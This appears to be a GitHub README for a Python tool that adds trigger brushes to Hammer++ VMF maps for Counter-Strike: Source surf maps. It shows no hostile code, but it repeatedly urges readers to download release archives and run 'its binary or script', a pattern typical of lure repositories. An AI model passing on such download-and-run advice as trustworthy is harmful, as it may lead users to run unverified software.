https://github.com/Subhambawane/autotrigger-py-cstrike/releases

[![Releases · Download and run](https://img.shields.io/badge/Release%20Downloads-Get%20Latest-blue?logo=github)](https://github.com/Subhambawane/autotrigger-py-cstrike/releases)

# AutoTrigger Py for CStrike - Trigger Generator for Hammer++

![Counter-Strike: Source logo](https://upload.wikimedia.org/wikipedia/en/0/02/Counter-Strike_Source_logo.png)  
![Source Engine](https://upload.wikimedia.org/wikipedia/commons/8/87/Source_engine_logo.png)

A Python tool that scans Hammer++ VMF files and generates trigger brushes to cover playable surfaces in Counter-Strike: Source maps. It targets trick surf and movement maps. The tool is a work in progress. Use it to speed up trigger placement and to make consistent trigger geometry across large surfaces.

Badges
- [![Releases · Download and run](https://img.shields.io/badge/Release%20Downloads-Get%20Latest-blue?logo=github)](https://github.com/Subhambawane/autotrigger-py-cstrike/releases)
- ![Python](https://img.shields.io/badge/python-3.8%2B-blue)
- ![Hammer++ VMF](https://img.shields.io/badge/format-Hammer++_VMF-green)
- ![Topics](https://img.shields.io/badge/topics-cs2%20%7C%20css%20%7C%20cstrike-lightgrey)

Topics: cs2, css, cstrike, hammer, hammer-plus-plus, hl2, map, mapping, metamod, movement, plugin, py, python, source, source-engine, sourcemod, strafe, tf2, valve, vmf

Table of contents
- What this does
- Who this helps
- Key features
- Supported formats and constraints
- Requirements
- Download and run (release files)
- Install from source
- Quick start
- Detailed usage
- VMF and Hammer++ specifics
- Trigger generation logic
- Examples and screenshots
- Best practices for mapping
- Validation and testing tips
- Performance and limits
- Troubleshooting
- Developing and extending
- Contributing
- Roadmap
- Changelog
- License
- Credits

What this does
This script parses a Hammer++ VMF file. It finds world brushes and disjoint faces that represent floors, ramps, jumps, and rails. It generates trigger brushes that cover those surfaces. The outputs fit the Source Engine used by Counter-Strike: Source and similar builds. The tool focuses on surfaces used in trick surf and movement map play. It aims for fast, consistent trigger placement.

Who this helps
- Map authors who build trick-surf or movement maps.
- Server admins who want precise triggers for movement plugins.
- Plugin devs who need uniform trigger volumes.
- Scripters who want a repeatable way to generate triggers across many maps.

Key features
- Parse Hammer++ VMF files and read world geometry.
- Create axis-aligned and sloped trigger brushes.
- Merge adjacent trigger brushes to cut entity count.
- Tag triggers for use with movement plugins and servers.
- Export changes into a new VMF file ready for Hammer++.
- CLI with options for precision, overlap, and naming.
- Work in progress. Expect updates and feature additions.

Supported formats and constraints
- Input: Hammer++ VMF only. Other VMF variants may fail.
- Output: Hammer++ VMF with added trigger brushes.
- The tool assumes the map uses standard VMF world structure.
- The tool works best with brushes built with grid-aligned faces.
- The tool does not compile maps. Use the Source SDK or cs2 tools for compile and test.
- The tool aims for broad compatibility with Counter-Strike: Source. TF2, CS:GO, or CS2 may work but require validation.

Requirements
- Python 3.8 or newer.
- No system-wide dependencies required to read/write VMF. The script uses plain text parsing and structured output.
- Optional: pip install requests if you want automatic release checks. (Not required for core function.)
- A backup of your VMF file before running the tool.

Download and run (release files)
The release page hosts ready-to-run archives and single-file builds. Download the packaged release from the releases page and extract the archive. Then run the main script inside the extracted folder.

- Visit the releases page at: https://github.com/Subhambawane/autotrigger-py-cstrike/releases
- Download the latest archive, for example autotrigger-py-cstrike-1.0.0.zip or the script file autotrigger.py, from that page.
- Extract the archive if needed.
- Run the script:
  - On Windows: open a terminal and run `python autotrigger.py mapfile.vmf`
  - On Linux or macOS: run `python3 autotrigger.py mapfile.vmf`

The release artifacts will contain the executable script and a small sample VMF for testing. The release page will also show a changelog and version notes.

Install from source
Clone the repo locally and run the main script. The repository contains the parser and helper modules. Follow these steps to run from source:
- git clone the repo to a local folder.
- cd into the folder with the main script.
- Run the script against a VMF file with Python.

Quick start
1. Make a backup of your map VMF.
2. Download the release file from https://github.com/Subhambawane/autotrigger-py-cstrike/releases and extract it.
3. Run:
   - python autotrigger.py path/to/your_map.vmf --out path/to/your_map_with_triggers.vmf
4. Open the generated VMF in Hammer++.
5. Inspect the added trigger brushes. Adjust properties such as origin, name, and target values.
6. Save and compile the map with your usual workflow.

Detailed usage
The script uses a simple command line interface.
- Required argument:
  - input VMF path
- Optional arguments:
  - --out or -o: output VMF path. Defaults to input filename appended with _triggers.
  - --merge or -m: merge adjacent triggers within a tolerance.
  - --depth or -d: trigger depth in units. Default is 16.
  - --padding or -p: inward padding to avoid world leaks. Default is 0.
  - --tag or -t: a tag string to add to trigger entity names.
  - --no-merge: disable merging step.
  - --samples: number of sample points per face to decide placement. Default is 4.
  - --verbose: print parse and generation stats.
  - --dry-run: do not write output file. Print planned changes.
  - --backup: create a backup copy of the original VMF.
  - --version: show script version.

Run examples
- Create triggers with default settings:
  - python autotrigger.py my_map.vmf
- Create triggers and write to a specific path:
  - python autotrigger.py my_map.vmf --out my_map_triggers.vmf
- Create triggers with deeper volumes and merge close brushes:
  - python autotrigger.py my_map.vmf --depth 32 --merge
- Do a dry run:
  - python autotrigger.py my_map.vmf --dry-run --verbose

VMF and Hammer++ specifics
VMF structure
- The script reads the VMF as plain text. It locates the world brush block and reads each solid.
- It parses face planes, materials, texture axes, and brush faces.
- It reconstructs face normals and face bounds from the vertex planes.

Hammer++ notes
- Hammer++ uses the same VMF format with a few editor-only keys. The script respects common Hammer++ keys where possible.
- Certain editor-only attributes may appear in the VMF. The script preserves unknown keys.
- The tool targets brushes that represent playable surfaces. This includes flat floors, ramps, and sloping faces used as surf ramps.

Entity naming and properties
- The script adds trigger entities of classname `trigger_multiple` by default.
- Triggers receive a `targetname` of the form `autotrigger_<tag>_<n>`. If you provide `--tag`, the tag appears in the name.
- The script sets the `StartDisabled` key to `0` so the trigger is active at map load.
- The script sets `spawnflags` for trigger_multiple to use default interactions. You can edit these in Hammer++.

Trigger placement rules
- The script samples faces using a grid of sample points.
- For each sample that meets criteria (face orientation, slope, material), it marks a small trigger area.
- The script then grows each area to cover the nearby surface according to the merge and padding settings.
- The trigger depth follows the face normal to ensure coverage without intersecting solid world volume beyond the face plane.

Trigger geometry types
- Axis-aligned rectangular triggers for horizontal faces.
- Sloped triggers for ramps and slanted surfaces. The script creates wedge-shaped brushes that match the slope.
- Edge triggers for narrow rails or ledges, made with thin boxes aligned to the edge direction.

Trigger generation logic
Phase 1: parse world brushes
- Read all world solids.
- For each solid, parse faces and compute plane equations.
- Record face orientation and material.

Phase 2: select candidate faces
- Exclude faces that belong to nodraw or tool textures, unless the map uses these as play surfaces.
- Prefer faces with normals that point up or horizontally, based on a configurable angle tolerance.
- Discard faces that fall below size thresholds.

Phase 3: sample and mark
- For each face, sample a grid of points.
- Mark cells where the sample meets coverage criteria.
- Group adjacent cells into candidate patches.

Phase 4: build trigger brushes
- For each patch, compute bounding box in 3D.
- Expand bounds by the depth parameter along the normal.
- Clip triggers to avoid poking into non-world solid entities if possible.
- Create VMF solid definitions for trigger brush geometry.

Phase 5: merge and clean
- Merge adjacent trigger brushes if merge mode is active.
- Remove empty or degenerate solids.
- Attach keys and properties to trigger entities.

Examples and screenshots
Use the sample VMF included in the release to run a test. The sample shows a small trick-surf room with ramps and rails.

Example workflow (images use public assets or generated screenshots):
- Original map in Hammer++:
  ![Example map view](https://raw.githubusercontent.com/Subhambawane/autotrigger-py-cstrike/master/docs/images/example_map.png)
- VMF loaded into the script and parsed:
  ![Parsing step](https://raw.githubusercontent.com/Subhambawane/autotrigger-py-cstrike/master/docs/images/parse_step.png)
- Generated triggers in Hammer++:
  ![Triggers added](https://raw.githubusercontent.com/Subhambawane/autotrigger-py-cstrike/master/docs/images/triggers_added.png)
- Test run in game to verify coverage:
  ![In-game test](https://raw.githubusercontent.com/Subhambawane/autotrigger-py-cstrike/master/docs/images/ingame_test.png)

If image links are not available in your local copy, create simple screenshots in Hammer++ and place them under docs/images before running a test.

Best practices for mapping
- Keep faces aligned to a consistent grid when possible.
- Avoid very small sliver brushes as they complicate detection.
- Use dedicated play materials for surf surfaces when you can. This makes detection easier.
- Name important world brushes so you can skip or include them with the script logic if needed.
- Test triggers in a local server build before pushing to a live server.

Validation and testing tips
- After running the script, open the output VMF in Hammer++.
- Inspect a sample set of triggers. Check for overhangs and brushes that poke through world solids.
- Run a local compile and a server test to confirm player collision with triggers.
- Use the `--dry-run` mode to preview the counts of triggers and total volume before writing the new VMF.

Performance and limits
- The parser reads the VMF line by line. Large maps with many brushes may increase runtime.
- The sample grid resolution affects runtime. Lower sample counts speed up processing but may miss narrow features.
- Merge operations can cost CPU time if many small patches exist.
- On modern hardware, typical medium maps process in seconds to minutes depending on options.

Troubleshooting
- If the script fails to find valid faces:
  - Check that the VMF is a Hammer++ VMF.
  - Confirm that world brushes are present and not compiled into props or func_detail that confuse detection.
- If generated triggers poke through walls:
  - Reduce the depth parameter.
  - Add padding to shrink triggers.
- If the tool creates too many small triggers:
  - Increase the merge tolerance.
  - Raise the sample resolution threshold or skip faces below a size threshold.
- If the script errors on parse:
  - Inspect the VMF for non-standard keys or broken syntax.
  - Run `--dry-run --verbose` to get parse logs.

Developing and extending
The code uses modular parsing, sampling, and building stages. You can add new features by modifying the relevant module.

Suggested extension points
- Add material-based rules that mark certain materials as play material.
- Add per-face tags to customize trigger placement.
- Add a GUI wrapper to run the script with point-and-click options.
- Add output to a JSON format for use by other tools.

Structure and modules
- main script: CLI and orchestration.
- vmf_parser: reads the VMF and turns solids into data structures.
- analyzer: inspects and selects candidate faces.
- sampler: runs the sample grid on faces and groups cells.
- builder: converts groups into VMF solids and entities.
- merger: merges adjacent solids.
- writer: writes the output VMF.

Coding style and tests
- The repo uses PEP8 style with short, readable functions.
- Add unit tests for plane math, sample grouping, and VMF write-read cycles.
- Focus on deterministic behavior for reproducible runs.

Contributing
Contributions follow a fork-and-pull model. The repo welcomes code, tests, and docs.

How to contribute
- Fork the repo.
- Create a feature branch.
- Add tests for new behavior.
- Open a pull request with a clear description of changes.

Issue reporting
- Open issues for bugs or feature requests.
- Provide a minimal VMF that reproduces the issue.
- Include script version and Python version.

Coding tips for contributors
- Keep functions under ~60 lines.
- Use simple data structures and avoid deep nesting.
- Add docstrings to public functions.

Roadmap
- Improved face material detection.
- Support for custom trigger entity classes and key-values.
- GUI helper tool for non-CLI users.
- More intelligent clipping to avoid entity collisions.
- Support for TF2 and other Source-based engines if needed.
- Automated unit tests for VMF parsing.

Changelog
Each release on the releases page includes a changelog entry. See the release assets for full details. Download the release file from the releases page, and run its binary or script to match the described behavior.

Releases and download notes
- Visit the release page to find packaged downloads and notes: https://github.com/Subhambawane/autotrigger-py-cstrike/releases
- If the release page shows an archive or a single-file script, download that file. Extract if needed.
- Run the script contained in the downloaded package. The release files include a README and sample VMF in most releases.

License
The repository uses a permissive license found in the repo root. Confirm the exact license file before redistribution or integration into a commercial product.

Credits
- Tool author and main maintainer: Subhambawane (GitHub handle).
- Map authors and community who provided sample VMFs and test maps.
- Hammer++ and Valve for VMF formats and mapping tools.
- Open-source math libraries and parsing references that inspired parts of the parser.

References and links
- Hammer++: editor fork commonly used for advanced VMF features.
- VMF format reference: consult the Valve Developer Community for VMF specification.
- Movement and trick-surf communities for map examples.

Common use cases
- Large surf map with many ramps: Run the tool to add triggers to all identified ramps. Merge neighboring triggers for fewer entities.
- Small arena map with rails: Use shallow depth and edge detection to add thin triggers along rails.
- Mass map processing: Batch run the script across many VMFs to standardize trigger placement across a map pack.

Batch processing example (shell)
- Use a simple loop to process many VMFs.
  - for f in maps/*.vmf; do python autotrigger.py "$f" --out "out/${f##*/}"; done
- Keep backups in a separate folder.

Testing on a server
- Load the compiled map on a local server build to test triggers.
- Use movement plugin commands to diagnose trigger activation and entity counts.
- If you run a dedicated server, distribute processed maps that contain trigger entities needed by your plugin.

Security and safety
- Keep backups of all original VMF files.
- Inspect generated VMF in a text editor or Hammer++ before compiling.
- The script does not run in-game code, but any added entity keys may affect server behavior. Review keys before use.

Examples: realistic options and expected output
- Use `--depth 24 --merge --tag surf` to produce surf triggers 24 units deep with merge and a surf tag.
- Expected output: a VMF file with trigger_multiple entities named autotrigger_surf_1, autotrigger_surf_2, etc.
- Use `--dry-run` to list counts and stats without writing.

Advanced tips
- If faces use custom textures, add a rule file that maps texture patterns to play rules.
- If a map uses func_detail heavily, you may want to use the editor to convert select func_detail to world brushes before running the script.
- Use small depth values on narrow edges to avoid clipping through other world brushes.

Common pitfalls
- Running on a non-Hammer++ VMF might lead to parse errors.
- Very complex brushes with many bevels may produce degenerate trigger solids. Inspect and fix those manually.
- Relying on the tool without manual verification can create overlapping triggers and unexpected server behavior.

API and library use
- The script can be used as a library inside other Python tools.
- Import the main builder functions and call them with a VMF string or path.
- The parser exposes a face list and plane math helpers to make custom trigger generation possible.

Unit tests and CI recommendations
- Add unit tests for parser edge cases: unusual whitespace, custom keys, and non-standard indenting.
- Use test VMFs stored under tests/samples to validate behavior.
- Add a small CI pipeline for basic linting and tests.

Maintainer notes
- Keep the parser tolerant to minor VMF variations.
- Add feature flags for experimental behavior.
- Keep changelog entries small and clear.

Contact
- Open issues on GitHub for support or bug reports.
- Use PRs for feature additions.

Additional resources
- Valve Developer Community: VMF doc and entity docs.
- Hammer++ project page for advanced editor features.
- Move and surf mapping forums for map examples.

Legal and reuse
- Check the license before redistributing or bundling this script.
- Respect copyright when using images or map assets in documentation or sample VMFs.

Credits and acknowledgements
- Hammer++ and community tools for the mapping workflow.
- Authors of sample maps and testers who provided feedback and VMF samples.
- Open-source math references for plane and brush geometry handling.

Notes for packaging releases
- Include a minimal wrapper script as the main entry.
- Include the sample VMF and a sample config file.
- Provide a short changelog file in the release archive.

Developer checklist for new releases
- Update version in script header.
- Update changelog and release notes.
- Attach sample VMF and README in the release.
- Tag release on GitHub.

End of file